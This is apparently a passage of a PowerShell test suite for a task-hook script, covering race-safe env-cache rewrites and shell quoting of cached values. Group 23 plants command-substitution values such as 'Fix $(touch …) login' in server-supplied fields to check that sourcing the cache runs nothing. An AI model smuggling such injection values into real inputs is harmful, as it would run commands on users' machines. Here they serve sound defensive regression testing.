# discards a concurrent write more completely than any rewrite does - so the
# delete is fingerprint-checked too.
$null = New-RecordFixture -Name 'casdelete'
[System.IO.File]::WriteAllText($script:EnvCache, "BOARD_ID='55'`n", (New-Object System.Text.UTF8Encoding($false)))
$g22DelRc = Invoke-EnvCacheRewrite -What 'the 22t-i probe' -DeleteWhenEmpty -Build { param($before) return @() }
Assert-Eq "22t-i (D289): an empty result with -DeleteWhenEmpty removes the cache" "True" "$g22DelRc"
Assert-Eq "22t-i (D289): and the cache is gone" "False" "$(Test-Path $script:EnvCache)"
# The same empty result WITHOUT the switch writes an empty cache instead of
# deleting it - the distinction the other four callers rely on.
[System.IO.File]::WriteAllText($script:EnvCache, "BOARD_ID='55'`n", (New-Object System.Text.UTF8Encoding($false)))
$g22NoDelRc = Invoke-EnvCacheRewrite -What 'the 22t-i keep probe' -Build { param($before) return @() }
Assert-Eq "22t-i (D289): without the switch an empty result still commits" "True" "$g22NoDelRc"
Assert-Eq "22t-i (D289): and the cache survives as a file" "True" "$(Test-Path $script:EnvCache)"

# 22t-j (D289): the DELETE half of -DeleteWhenEmpty under contention, which is
# the assertion 22t-i above does not make. An empty result means "remove the
# cache", and a bare Remove-Item discards a concurrent write more completely
# than any rewrite does - so the delete is fingerprint-checked, and a write that
# landed after our read must send the Build round again rather than be deleted.
#
# The second attempt is the whole point: the real caller's Build re-reads, finds
# the concurrent writer's preservable records, and returns THEM - so the branch
# writes instead of deleting. That is the end-to-end behaviour, not just "the
# delete was skipped".
#
# MUTATION-TESTED: with the fingerprint re-check before Remove-Item deleted, the
# cache is removed on attempt 1 and both survival assertions below go red.
$null = New-RecordFixture -Name 'casdelrace'
[System.IO.File]::WriteAllText($script:EnvCache, "BOARD_ID='55'`n", (New-Object System.Text.UTF8Encoding($false)))
$script:g22DelAttempt = 0
$g22DelRaceRc = Invoke-EnvCacheRewrite -What 'the 22t-j probe' -DeleteWhenEmpty -Build {
    param($before)
    $script:g22DelAttempt++
    if ($script:g22DelAttempt -eq 1) {
        # A second agent's claim lands after we read and decided "nothing to
        # preserve" - its records are exactly what must not be deleted.
        [System.IO.File]::WriteAllText($script:EnvCache,
            "BOARD_ID='55'`nTASK_ID='777'`nTASK_IDENTIFIER='W777'`n",
            [System.Text.Encoding]::GetEncoding(28591))
        return @()
    }
    # Attempt 2 re-reads and finds the concurrent writer's records.
    $recs = Split-EnvCacheRecord
    if (-not $recs.Ok) { throw 'env cache ends inside a quoted value' }
    return @($recs.Records)
}
Assert-Eq "22t-j (D289): the delete-path race actually fired" "2" "$($script:g22DelAttempt)"
Assert-Eq "22t-j (D289): the rewrite reports success" "True" "$g22DelRaceRc"
Assert-Eq "22t-j (D289): the cache was NOT deleted out from under the concurrent write" "True" `
    "$(Test-Path $script:EnvCache)"
$g22DelOut = (Get-EnvCacheLine) -join '|'
Assert-Contains "22t-j (D289): the concurrent claim's TASK_ID survives the delete branch" "TASK_ID='777'" $g22DelOut
Assert-Contains "22t-j (D289): and its TASK_IDENTIFIER survives too" "TASK_IDENTIFIER='W777'" $g22DelOut

# 22t-c: helper semantics, including the zero-byte case that used to read as
# absent. PowerShell unrolls a returned array, so a 0-byte cache came back as
# $null exactly like a missing one — and Write-EnvCache -Lines @() reaches that
# state, so a swap against "expected absent" could commit over a file another
# process had just created.
$null = New-RecordFixture -Name 'helpers'
[System.IO.File]::WriteAllText($script:EnvCache, "BOARD_ID=55`n", (New-Object System.Text.UTF8Encoding($false)))
$g22Present = Get-EnvCacheRawByte
Assert-Eq "22t-c (D282): a readable cache does not report the unreadable sentinel" "False" "$($g22Present -is [string])"
Assert-Eq "22t-c (D282): expected-absent does not match a present cache" "False" `
    "$(Test-EnvCacheUnchanged -Expected $null -Actual $g22Present)"
Assert-Eq "22t-c (D282): and the unreadable sentinel never compares equal" "False" `
    "$(Test-EnvCacheUnchanged -Expected 'unreadable' -Actual $g22Present)"
[System.IO.File]::WriteAllBytes($script:EnvCache, [byte[]]@())
$g22Empty = Get-EnvCacheRawByte
Assert-Eq "22t-c (D282): a zero-byte cache is not reported as absent" "False" "$($null -eq $g22Empty)"
Assert-Eq "22t-c (D282): and expected-absent does not match a zero-byte cache" "False" `
    "$(Test-EnvCacheUnchanged -Expected $null -Actual $g22Empty)"

# 22t-d: the cache is UNREADABLE at re-read time — the task's first named edge
# case, driven for real rather than asserted about.
#
# A first draft put a DIRECTORY at the cache path, on the assumption that
# ReadAllBytes would throw. It does not get that far: Test-Path -PathType Leaf
# is false for a container, so the helper reports ABSENT, and Move-Item then
# moves the staged temp INTO the directory and reports success. Recorded
# because the wrong answer there looks exactly like the right one — the write
# "succeeds" while the cache is nowhere. Nothing creates a directory at that
# path, so it is not filed, but it is not what "unreadable" means either.
#
# A permission denial is the real shape, and matches the Windows sharing
# violation the helper's comment is about. Skipped when running as root, where
# the mode is not enforced.
$null = New-RecordFixture -Name 'unreadable'
[System.IO.File]::WriteAllText($script:EnvCache, "TASK_BASE_REF_9='abc123'`n", (New-Object System.Text.UTF8Encoding($false)))
[System.Environment]::SetEnvironmentVariable('TASK_BASE_REF_9', 'abc123', 'Process')
$g22Uid = (& id -u 2>$null | Out-String).Trim()
if ($g22Uid -eq '0' -or -not $g22Uid) {
    Write-Host "  SKIP: 22t-d (D282): the unreadable-cache case needs a non-root uid" -ForegroundColor Yellow
} else {
    & chmod 000 $script:EnvCache 2>$null
    $g22ReadBack = Get-EnvCacheRawByte
    # Non-vacuity: if the chmod did not take, the case below proves nothing.
    Assert-Eq "22t-d (D282): the cache really is unreadable now" "True" "$($g22ReadBack -is [string])"
    $g22UnreadRc = Set-TaskNarrowedRecord -TaskId '9' -Value 'yes'
    Assert-Eq "22t-d (D282): a record write over an unreadable cache is refused" "False" "$g22UnreadRc"
    & chmod 644 $script:EnvCache 2>$null
    $g22Restored = (Get-EnvCacheLine) -join '|'
    Assert-Contains "22t-d (D282): and the original content is left untouched" "TASK_BASE_REF_9='abc123'" $g22Restored
    if ($g22Restored -match 'TASK_NARROWED_9=') {
        Write-Host "  FAIL: 22t-d (D282): the refused write reached the cache anyway" -ForegroundColor Red
        $script:FAIL++
    } else {
        Write-Host "  PASS: 22t-d (D282): and the refused write did not reach the cache" -ForegroundColor Green
        $script:PASS++
    }
}

# 22t-d2: a DIRECTORY at the cache path is "not a file", not "absent". This was
# a regression D282 introduced and is fixed here rather than only noted: the
# helper's -PathType Leaf test is false for a container, so the path reported
# absent, the swap matched "expected absent", and Move-Item relocated the staged
# temp INTO the directory while Set-TaskRecord returned SUCCESS over a cache
# that does not exist as a file — stranding a copy carrying TASK_* identity
# lines at an unintended path. The pre-D282 code failed safe here. Failing
# success-shaped is the exact shape this task exists to close.
$null = New-RecordFixture -Name 'dircache'
Remove-Item -LiteralPath $script:EnvCache -Force -ErrorAction SilentlyContinue
New-Item -ItemType Directory -Path $script:EnvCache -Force | Out-Null
[System.Environment]::SetEnvironmentVariable('TASK_BASE_REF_9', 'abc123', 'Process')
Assert-Eq "22t-d2 (D282): a directory at the cache path reads as unreadable, not absent" "True" `
    "$((Get-EnvCacheRawByte) -is [string])"
$g22DirRc = Set-TaskNarrowedRecord -TaskId '9' -Value 'yes'
Assert-Eq "22t-d2 (D282): and the record write is refused rather than reporting success" "False" "$g22DirRc"
$g22Stranded = @(Get-ChildItem -LiteralPath $script:EnvCache -Force -ErrorAction SilentlyContinue).Count
# Nothing is stranded — but note WHERE that is decided, because the wording
# could otherwise be read as a claim about Move-Item. Set-TaskRecord refuses at
# the sentinel and returns before Write-EnvCache is ever called, so no temp is
# staged and there is nothing to relocate. Move-Item itself is still unguarded:
# calling Write-EnvCache WITHOUT -CompareAndSwap over a directory returns $true
# and strands the staged cache, identically before and after D282. That is
# pre-existing on the non-CAS path, is NOT fixed here, and is recorded on D289.
Assert-Eq "22t-d2 (D282): and nothing was stranded, because the refusal precedes any staging" "0" "$g22Stranded"
Remove-Item -LiteralPath $script:EnvCache -Recurse -Force -ErrorAction SilentlyContinue

# 22t-e: three collisions REFUSE rather than clobber. Nothing else drives the
# bounded-retry exit, so without this the refusal branch is unreachable in test.
$null = New-RecordFixture -Name 'persistent'
[System.IO.File]::WriteAllText($script:EnvCache, "TASK_BASE_REF_9='abc123'`nTASK_ID='777'`n", (New-Object System.Text.UTF8Encoding($false)))
[System.Environment]::SetEnvironmentVariable('TASK_BASE_REF_9', 'abc123', 'Process')
$script:g22Collide = 0
$g22RealRawByte2 = ${function:Get-EnvCacheRawByte}
function Get-EnvCacheRawByte {
    $bytes = & $g22RealRawByte2
    # A writer we cannot keep up with: it commits on EVERY attempt.
    $script:g22Collide++
    [System.IO.File]::WriteAllText($script:EnvCache,
        "TASK_BASE_REF_9='abc123'`nTASK_ID='777'`nTASK_SPIN='$($script:g22Collide)'`n",
        [System.Text.Encoding]::GetEncoding(28591))
    # The comma is only correct for a byte[]. Applied to the 'unreadable'
    # sentinel it yields an Object[], and `-is [string]` is then False, so
    # Set-TaskRecord's refuse branch would be skipped and the write would
    # proceed against a garbage fingerprint. A shadow must preserve the sentinel.
    if ($bytes -is [string]) { return $bytes }
    return ,$bytes
}
$g22SpinRc = Set-TaskNarrowedRecord -TaskId '9' -Value 'yes'
${function:Get-EnvCacheRawByte} = $g22RealRawByte2
Assert-Eq "22t-e (D282): a write that collides on every attempt is refused, not forced" "False" "$g22SpinRc"
# SIX, not three: Get-EnvCacheRawByte is called twice per attempt — once by
# Set-TaskRecord to take the fingerprint, once by Write-EnvCache to re-check it
# immediately before the rename. Pinning the observed number rather than the
# attempt count makes a change to EITHER visible: add a third read per attempt,
# or a fourth attempt, and this fails and says so.
Assert-Eq "22t-e (D282): it gave up after 3 attempts (2 cache reads each)" "6" "$($script:g22Collide)"
$g22Spun = (Get-EnvCacheLine) -join '|'
Assert-Contains "22t-e (D282): the concurrent writer's content is left in place" "TASK_ID='777'" $g22Spun
if ($g22Spun -match "TASK_NARROWED_9=") {
    Write-Host "  FAIL: 22t-e (D282): the refused record was written anyway" -ForegroundColor Red
    $script:FAIL++
} else {
    Write-Host "  PASS: 22t-e (D282): and the refused record never reached the cache" -ForegroundColor Green
    $script:PASS++
}

# 22t-f: two record writes to DIFFERENT keys interleave — the task's second
# named edge case. Neither may erase the other.
$null = New-RecordFixture -Name 'twokeys'
[System.IO.File]::WriteAllText($script:EnvCache, "TASK_BASE_REF_9='abc123'`nTASK_BASE_REF_8='def456'`n", (New-Object System.Text.UTF8Encoding($false)))
[System.Environment]::SetEnvironmentVariable('TASK_BASE_REF_9', 'abc123', 'Process')
[System.Environment]::SetEnvironmentVariable('TASK_BASE_REF_8', 'def456', 'Process')
$script:g22TwoKey = 0
$g22RealSplit3 = ${function:Split-EnvCacheRecord}
function Split-EnvCacheRecord {
    $recs = & $g22RealSplit3
    if ($script:g22TwoKey -eq 0) {
        $script:g22TwoKey = 1
        # The other task's record write commits after we read, so our staged
        # line set does not contain it.
        [System.IO.File]::WriteAllText($script:EnvCache,
            "TASK_BASE_REF_9='abc123'`nTASK_BASE_REF_8='def456'`nTASK_NARROWED_8='no'`n",
            [System.Text.Encoding]::GetEncoding(28591))
    }
    return $recs
}
$null = Set-TaskNarrowedRecord -TaskId '9' -Value 'yes'
${function:Split-EnvCacheRecord} = $g22RealSplit3
Assert-Eq "22t-f (D282): the two-key interleave actually fired" "1" "$($script:g22TwoKey)"
Assert-Eq "22t-f (D282): the other task's record survives" "no" "$((Get-TaskNarrowedRecord -TaskId '8').Value)"
Assert-Eq "22t-f (D282): and ours lands beside it" "yes" "$((Get-TaskNarrowedRecord -TaskId '9').Value)"

# --- 22s: the D274 defect END TO END, claim then completion ---
# testing_strategy.integration_tests[0] - "a completion with 22 open windows
# produces a snapshot over the task's real commits rather than an empty one".
# 25d counts survivors and 22q asserts cache contents; neither drives a
# COMPLETION at that window count through to a snapshot, which is the form the
# defect was actually MEASURED in: 19 concurrently open children left the outer
# intact, 20 lost its anchor and it completed with an EMPTY snapshot over real
# commits.
#
# The chain is what makes it end to end: a claim evicts (or does not evict) the
# outer's anchor, and the OUTER's completion is what reveals the loss. With the
# anchor gone, Resolve-TaskSnapshotBase falls back to the shared TASK_BASE_REF -
# which that same claim just re-stamped as its own - and D226's foreign-owner
# refusal correctly uploads '[]'. Correct refusal, lost deliverable.
if (-not (Get-Command git -ErrorAction SilentlyContinue)) {
    Write-Host "  SKIP: 22s: the end-to-end eviction case needs git" -ForegroundColor Yellow
} else {
    $g22s = Join-Path $TmpDir 'g22s-outer-completion'
    New-Item -ItemType Directory -Path $g22s -Force | Out-Null
    & git -C $g22s init -q 2>$null | Out-Null
    & git -C $g22s config user.email 'test@test.local' 2>$null | Out-Null
    & git -C $g22s config user.name 'Test' 2>$null | Out-Null
    & git -C $g22s config commit.gpgsign false 2>$null | Out-Null
    Set-Content -Path (Join-Path $g22s '.gitignore') `
        -Value "/.stride.md`n/.stride-env-cache`n/.stride-changed-files.json`n/.stride-diff-upload-state`n/.stride-dirty-baseline" -Encoding UTF8
    Set-Content -Path (Join-Path $g22s 'seed.txt') -Value 'seed' -Encoding UTF8
    & git -C $g22s add -A 2>$null | Out-Null
    & git -C $g22s commit -q -m 'seed' 2>$null | Out-Null
    $g22sBase = (& git -C $g22s rev-parse HEAD 2>$null | Out-String).Trim()
    # The outer task's REAL work - the commit the defect loses.
    Set-Content -Path (Join-Path $g22s 'outer-deliverable.txt') -Value 'the outer task work' -Encoding UTF8
    & git -C $g22s add -A 2>$null | Out-Null
    & git -C $g22s commit -q -m 'outer work' 2>$null | Out-Null
    Set-Content -Path (Join-Path $g22s '.stride.md') -Value @'
## before_doing
```bash
echo "claimed"
```

## after_doing
```bash
echo "ran"
```
'@ -Encoding UTF8
    # THE OUTER TASK ID IS 4242, NOT 42. This case is what caught the harness
    # contaminating itself: Invoke-HookScript used to copy the TEST process
    # environment wholesale into the hook child, and Group 22's unit cases leave
    # TASK_BASE_REF_42='abc123' set. With the anchor evicted the child read that
    # inherited value instead of refusing, could not resolve 'abc123', fell back
    # to HEAD~1 and produced a plausible non-empty snapshot - so both payoff
    # assertions below passed under the very mutation they exist to catch. The
    # class is now stripped in Invoke-HookScript (see $script:StrideChildEnvStrip,
    # pinned by 9k2); an id nothing else touches is kept on top of that, because
    # isolation a case owns itself does not depend on a guard elsewhere staying
    # correct.
    # The outer (4242) first, i.e. oldest, then 22 open children - the measured
    # geometry, one past the 20 that lost it.
    $g22sLines = New-Object System.Collections.Generic.List[string]
    $g22sLines.Add("TASK_ID=4242") | Out-Null
    $g22sLines.Add("TASK_BASE_REF_4242='$g22sBase'") | Out-Null
    for ($i = 101; $i -le 122; $i++) {
        $g22sLines.Add("TASK_BASE_REF_$i='$g22sBase'") | Out-Null
    }
    Set-Content -Path (Join-Path $g22s '.stride-env-cache') -Encoding UTF8 -Value $g22sLines
    $g22sClaim = @{
        tool_input = @{ command = 'curl -X POST https://stride.example.com/api/tasks/claim' }
        tool_response = @{ stdout = '{"data":{"id":99,"identifier":"W99","title":"Inner","status":"in_progress","complexity":"small","priority":"high"}}'; stderr = ''; interrupted = $false }
    } | ConvertTo-Json -Compress
    $r = Invoke-HookScript -InputJson $g22sClaim -Phase 'post' -ProjectDir $g22s
    Assert-Exit "22s: the nested claim over 22 open windows exits 0" 0 $r.ExitCode
    # CONTROL: the anchor is what the completion below depends on, so assert it
    # survived the claim BEFORE asserting what it buys - otherwise a failure
    # downstream cannot say which half broke.
    $g22sCache = @(Get-Content -Path (Join-Path $g22s '.stride-env-cache') -Encoding UTF8 -ErrorAction SilentlyContinue)
    Assert-Contains "22s: CONTROL - the outer's anchor survives the nested claim" `
        "TASK_BASE_REF_4242='$g22sBase'" "$($g22sCache -join "`n")"
    # Now complete the OUTER task. Port 1 refuses instantly, so only the
    # on-disk snapshot is under test.
    $g22sComplete = @{
        tool_input = @{ command = 'curl -X PATCH http://127.0.0.1:1/api/tasks/4242/complete -H "Authorization: Bearer tok"' }
    } | ConvertTo-Json -Compress
    $r = Invoke-HookScript -InputJson $g22sComplete -Phase 'pre' -ProjectDir $g22s
    Assert-Exit "22s: the outer's completion exits 0" 0 $r.ExitCode
    $g22sSnap = Get-Content -Raw -Path (Join-Path $g22s '.stride-changed-files.json') -ErrorAction SilentlyContinue
    Assert-Contains "22s (D274): the outer completes over its REAL commits, not an empty snapshot" `
        'outer-deliverable.txt' "$g22sSnap"
    Assert-Eq "22s (D274): and the snapshot is not the '[]' the defect produced" "0" `
        "$(@(@("$g22sSnap".Trim()) | Where-Object { $_ -eq '[]' }).Count)"
}

}

# ============================================================
# Test Group 23: D280 — every env-cache write is sq_escape-quoted
# ============================================================
# The cache is SOURCED by stride-hook.sh under `set -a`, so every value this
# port writes into it is shell syntax, not data. Before D280 three write sites
# emitted `KEY=value` bare, and a server-supplied `$(command)` was a command
# substitution bash EXECUTED at source time.
#
# The fix is two-sided and these tests hold both sides: the WRITERS quote via
# ConvertTo-ShSingleQuoted, and the LOADER unquotes via ConvertFrom-ShSingleQuoted
# so the process environment — inherited by every `bash -c` child running a
# .stride.md section — still carries bare values, exactly as bash's `source`
# produces. Either side alone is a regression, so 23c asserts the bare value
# reaches a real section child rather than stopping at the cache.
Write-Host ""
Write-Host "=== Test Group 23: D280 env-cache quoting ==="

$g23Want = @('ConvertTo-ShSingleQuoted', 'ConvertFrom-ShSingleQuoted')
$g23Ast = [System.Management.Automation.Language.Parser]::ParseFile($HookScript, [ref]$null, [ref]$null)
$g23Fns = $g23Ast.FindAll({ param($n) $n -is [System.Management.Automation.Language.FunctionDefinitionAst] }, $true)
$g23Found = @()
foreach ($f in $g23Fns) {
    if ($g23Want -contains $f.Name) {
        $g23Found += $f.Name
        . ([scriptblock]::Create($f.Extent.Text))
    }
}
$g23Missing = @($g23Want | Where-Object { $g23Found -notcontains $_ })
if ($g23Missing.Count -gt 0) {
    Write-Host "  FAIL: 23-harness: could not extract from stride-hook.ps1: $($g23Missing -join ', ')" -ForegroundColor Red
    $script:FAIL++
} else {
    Write-Host "  PASS: 23-harness: both escaper halves extracted from the real hook" -ForegroundColor Green
    $script:PASS++

$g23Bash = Get-Command bash -ErrorAction SilentlyContinue
$g23Q = [char]39

# --- 23a: the loader's unquote is the EXACT inverse of the writer's quote ---
# Covers all three testing_strategy edge cases: a value that already contains
# the sequence '\'' BEFORE escaping, an empty value, and a value that is only a
# single quote. A .Trim("'") would fail the first and the last; that is why the
# inverse is a real inverse and not a trim.
$g23Probes = @(
    'yes',
    '',
    "$g23Q",
    "a$($g23Q)b",
    "a$g23Q\$g23Q$($g23Q)b",
    'Fix $(cmd)',
    'back`tick',
    'a\b',
    '  padded  ',
    "ends$g23Q"
)
$g23RoundFail = 0
foreach ($probe in $g23Probes) {
    if ((ConvertFrom-ShSingleQuoted -Value (ConvertTo-ShSingleQuoted -Value $probe)) -ne $probe) { $g23RoundFail++ }
}
Assert-Eq "23a: unquote(quote(v)) = v for every probe, including the '\'' and lone-quote cases" "0" "$g23RoundFail"
# A legacy cache written by a PRE-D280 ps1 holds BARE values. The loader must
# still read those, or upgrading the plugin blanks every cached variable.
Assert-Eq "23a: a legacy bare value passes through the loader unchanged" "6341" `
    (ConvertFrom-ShSingleQuoted -Value '6341')
Assert-Eq "23a: a quoted empty value unwraps to the empty string" "" `
    (ConvertFrom-ShSingleQuoted -Value "$g23Q$g23Q")

# --- 23b: what bash actually does with the written form ---
# Not a re-test of the escaper against itself: the line is written to a file and
# SOURCED by a real bash, which is the sink the defect is about.
if ($g23Bash) {
    $g23Dir = Join-Path $TmpDir 'g23-source'
    New-Item -ItemType Directory -Path $g23Dir -Force | Out-Null
    $g23Cache = Join-Path $g23Dir '.stride-env-cache'
    $g23SourceFail = 0
    foreach ($probe in $g23Probes) {
        [System.IO.File]::WriteAllText($g23Cache,
            "PROBE=" + (ConvertTo-ShSingleQuoted -Value $probe) + "`n",
            (New-Object System.Text.UTF8Encoding($false)))
        $got = (& bash -c '. "$1" > /dev/null 2>&1; printf %s "$PROBE"' _ $g23Cache 2>$null | Out-String).TrimEnd("`r", "`n")
        if ($got -ne $probe) { $g23SourceFail++ }
    }
    Assert-Eq "23b: every probe survives a real bash source byte for byte" "0" "$g23SourceFail"
} else {
    Write-Host "  SKIP: 23b: the bash source leg needs bash" -ForegroundColor Yellow
}

# --- 23c: THE REGRESSION TEST — a hostile value end to end ---
# ONE WRITE SITE PER LEG, DELIBERATELY. The first draft of this test supplied
# TASK_TITLE in BOTH data.title and the hook env block, and it passed with the
# claim identity block's escaping REVERTED: Set-HookEnv runs later and replaces
# the line in place (D260), so the env block's quoted value masked the identity
# block's bare one. Verified by reverting that writer and watching this test
# stay green. Keep the legs isolated, or this stops testing what it names.
#
# 23c1 - the claim identity block, with NO hook env in the response at all.
if ($g23Bash -and (Get-Command git -ErrorAction SilentlyContinue)) {
    $g23Proj = New-GitRepo -Name 'g23-hostile'
    $g23Marker = Join-Path $TmpDir 'g23-marker-must-not-exist'
    Remove-Item -Force $g23Marker -ErrorAction SilentlyContinue
    $g23Hostile = 'Fix $(touch ' + $g23Marker + ') login'
    # This section is what makes the leg cover the LOADER too, in isolation.
    # Within one run the claim handler writes the cache and the bulk loader
    # reads it back immediately afterwards (stride-hook.ps1: the handler block
    # closes just above the loader). With no hook env in this response there is
    # no Set-HookEnv export, so the ONLY path by which $TASK_TITLE can reach
    # this child is the loader unquoting what the identity block wrote. Drop
    # ConvertFrom-ShSingleQuoted and this assertion sees 'Fix $(...) login'
    # WITH the quotes attached.
    Set-Content -Path (Join-Path $g23Proj '.stride.md') -Encoding UTF8 -Value @'
# Stride Configuration

## before_doing
```bash
echo "title=[$TASK_TITLE]"
```

## after_doing
```bash
```

## before_review
```bash
```

## after_review
```bash
```

## after_goal
```bash
```
'@
    $g23Claim = @{
        tool_input = @{ command = 'curl -X POST https://stride.example.com/api/tasks/claim' }
        tool_response = @{
            stdout = (@{
                data = @{ id = 42; identifier = 'W42'; title = $g23Hostile
                          status = 'in_progress'; complexity = 'medium'; priority = 'high' }
            } | ConvertTo-Json -Depth 8 -Compress)
            stderr = ''; interrupted = $false
        }
    } | ConvertTo-Json -Depth 10 -Compress
    $r = Invoke-HookScript -InputJson $g23Claim -Phase 'post' -ProjectDir $g23Proj
    Assert-Exit "23c1: a claim carrying a hostile title exits 0" 0 $r.ExitCode
    # Guard the isolation the comment above depends on: if a future edit adds an
    # env block here, the leg silently stops covering the identity block.
    Assert-Eq "23c1: exactly one TASK_TITLE line, written by the identity block alone" "1" `
        "$(@(Get-Content (Join-Path $g23Proj '.stride-env-cache') -Encoding UTF8 | Where-Object { $_ -like 'TASK_TITLE=*' }).Count)"
    # Nothing executed while the hook itself ran...
    Assert-Eq "23c1: the hook run alone executed no command substitution" "False" `
        "$(Test-Path $g23Marker)"
    # ...nor when bash SOURCES the cache it wrote, which is the real sink.
    $g23Sourced = (& bash -c '. "$1" > /dev/null 2>&1; printf %s "$TASK_TITLE"' _ (Join-Path $g23Proj '.stride-env-cache') 2>$null | Out-String).TrimEnd("`r", "`n")
    Assert-Eq "23c1: sourcing the ps1-written cache executes no command substitution" "False" `
        "$(Test-Path $g23Marker)"
    # And the value is intact rather than mangled by the escaping.
    Assert-Eq "23c1: the hostile title round-trips verbatim through a bash source" $g23Hostile $g23Sourced
    # The LOADER half, isolated: no hook env in this response, so the loader is
    # the only way this value can reach the section child - bare, not quoted.
    Assert-Contains "23c1: the loader unquotes, so the section child sees the bare title" `
        "title=[$g23Hostile]" $r.Stdout
    Remove-Item -Force $g23Marker -ErrorAction SilentlyContinue
} else {
    Write-Host "  SKIP: 23c1: the end-to-end hostile-value test needs bash and git" -ForegroundColor Yellow
}

# 23c2 - Set-HookEnv, the OTHER server-fed writer, isolated in its own project.
# Its section-child assertion covers the EXPORT half, not the loader: Set-HookEnv
# calls SetEnvironmentVariable directly, so the child would see a bare value even
# with the loader broken. Verified by mutation - dropping ConvertFrom-ShSingleQuoted
# leaves this leg green. The loader is covered in isolation by 23c1, which
# supplies no hook env at all.
if ($g23Bash -and (Get-Command git -ErrorAction SilentlyContinue)) {
    $g23EnvProj = New-GitRepo -Name 'g23-hostile-env'
    $g23Marker2 = Join-Path $TmpDir 'g23-marker2-must-not-exist'
    Remove-Item -Force $g23Marker2 -ErrorAction SilentlyContinue
    $g23Hostile2 = 'Board $(touch ' + $g23Marker2 + ') name'
    Set-Content -Path (Join-Path $g23EnvProj '.stride.md') -Encoding UTF8 -Value @'
# Stride Configuration

## before_doing
```bash
echo "board=[$BOARD_NAME]"
```

## after_doing
```bash
```

## before_review
```bash
```

## after_review
```bash
```

## after_goal
```bash
```
'@
    $g23EnvClaim = @{
        tool_input = @{ command = 'curl -X POST https://stride.example.com/api/tasks/claim' }
        tool_response = @{
            stdout = (@{
                data = @{ id = 43; identifier = 'W43'; title = 'Plain title'
                          status = 'in_progress'; complexity = 'medium'; priority = 'high' }
                hook = @{ name = 'before_doing'; env = @{
                    BOARD_NAME = $g23Hostile2
                    BOARD_ID = "3$($g23Q)quoted$($g23Q)" } }
            } | ConvertTo-Json -Depth 8 -Compress)
            stderr = ''; interrupted = $false
        }
    } | ConvertTo-Json -Depth 10 -Compress
    $r = Invoke-HookScript -InputJson $g23EnvClaim -Phase 'post' -ProjectDir $g23EnvProj
    Assert-Exit "23c2: a claim whose hook env carries a hostile value exits 0" 0 $r.ExitCode
    $g23EnvCachePath = Join-Path $g23EnvProj '.stride-env-cache'
    $g23Board = (& bash -c '. "$1" > /dev/null 2>&1; printf %s "$BOARD_NAME"' _ $g23EnvCachePath 2>$null | Out-String).TrimEnd("`r", "`n")
    Assert-Eq "23c2: sourcing the cache executes no command substitution" "False" `
        "$(Test-Path $g23Marker2)"
    Assert-Eq "23c2: the hostile env value round-trips verbatim through a bash source" $g23Hostile2 $g23Board
    $g23BoardId = (& bash -c '. "$1" > /dev/null 2>&1; printf %s "$BOARD_ID"' _ $g23EnvCachePath 2>$null | Out-String).TrimEnd("`r", "`n")
    Assert-Eq "23c2: a quote-bearing env value survives the source verbatim" `
        "3$($g23Q)quoted$($g23Q)" $g23BoardId
    # The loader/export half: the section child must see the BARE value.
    Assert-Contains "23c2: the before_doing section child sees the bare, unquoted value" `
        "board=[$g23Hostile2]" $r.Stdout
    Remove-Item -Force $g23Marker2 -ErrorAction SilentlyContinue
} else {
    Write-Host "  SKIP: 23c2: the hook-env hostile-value test needs bash and git" -ForegroundColor Yellow
}

# --- 23c5 (D281): a non-ASCII value reaches disk as UTF-8, not as Latin-1 ---
# This is the guard for the ONE thing the Latin-1 storage projection can get
# wrong. The cache stores byte-strings, so a value that is TEXT must be
# projected at its IN boundary; miss that and 'café' is written as the single
# byte E9 where bash writes C3 A9 — a silent new divergence, and one the
# Write-EnvCache guard cannot catch because é is <= U+00FF.
#
# Assert the ON-DISK BYTES, never a round-trip. A round-trip is symmetric: it
# passes under any self-consistent-but-wrong encoding, which is exactly what a
# missed boundary produces. The byte assertion is the only form that fails.
#
# This case is GREEN before D281 and must STAY green after it. It is not a
# regression pin for the fix — it is the standing guard against the fix's own
# failure mode. Do not delete it as redundant.
if ($g23Bash -and (Get-Command git -ErrorAction SilentlyContinue)) {
    $d281Proj = New-GitRepo -Name 'd281-nonascii'
    Set-Content -Path (Join-Path $d281Proj '.stride.md') -Encoding UTF8 -Value @'
# Stride Configuration

## before_doing
```bash
```

## after_doing
```bash
```

## before_review
```bash
```

## after_review
```bash
```

## after_goal
```bash
```
'@
    # Two characters that exercise different halves of the risk: é is
    # U+0080-U+00FF, the range a missed projection silently mangles into one
    # byte; the CJK char is above U+00FF, which would trip the writer guard if
    # a projection were missed rather than being written wrongly.
    $d281Title = "Caf" + [string][char]0x00E9 + " " + [string][char]0x6F22 + " deja"
    $d281Claim = @{
        tool_input = @{ command = 'curl -X POST https://stride.example.com/api/tasks/claim' }
        tool_response = @{
            stdout = (@{
                data = @{ id = 281; identifier = 'D281'; title = $d281Title
                          status = 'in_progress'; complexity = 'large'; priority = 'high' }
            } | ConvertTo-Json -Depth 8 -Compress)
            stderr = ''; interrupted = $false
        }
    } | ConvertTo-Json -Depth 10 -Compress
    $d281R = Invoke-HookScript -InputJson $d281Claim -Phase 'post' -ProjectDir $d281Proj
    Assert-Exit "23c5: a claim carrying a non-ASCII title exits 0" 0 $d281R.ExitCode
    $d281Cache = Join-Path $d281Proj '.stride-env-cache'
    if (-not (Test-Path $d281Cache)) {
        Write-Host "  FAIL: 23c5 (D281): no env cache was written, so the byte assertions would prove nothing" -ForegroundColor Red
        $script:FAIL++
    } else {
        $d281Bytes = [System.IO.File]::ReadAllBytes($d281Cache)
        # é as UTF-8 is C3 A9. As mis-projected Latin-1 it would be a bare E9.
        $d281HasUtf8Eacute = $false
        for ($i = 0; $i -lt ($d281Bytes.Length - 1); $i++) {
            if ($d281Bytes[$i] -eq 0xC3 -and $d281Bytes[$i+1] -eq 0xA9) { $d281HasUtf8Eacute = $true; break }
        }
        $d281HasBareE9 = $false
        for ($i = 0; $i -lt $d281Bytes.Length; $i++) {
            if ($d281Bytes[$i] -eq 0xE9) {
                if ($i -eq 0 -or $d281Bytes[$i-1] -ne 0xC3) { $d281HasBareE9 = $true; break }
            }
        }
        Assert-Eq "23c5 (D281): a non-ASCII title reaches disk as UTF-8 (C3 A9), as bash writes it" "True" "$d281HasUtf8Eacute"
        Assert-Eq "23c5 (D281): and NOT as a mis-projected bare Latin-1 byte (E9)" "False" "$d281HasBareE9"
        # The bash executor must read back exactly what was written. Compare
        # BYTES, via a file, never bash's stdout: native-command output is
        # decoded through [Console]::OutputEncoding, which is UTF-8 on pwsh 7
        # but the console OEM code page on Windows PowerShell 5.1 — the shipping
        # host. A non-ASCII literal compared against captured stdout therefore
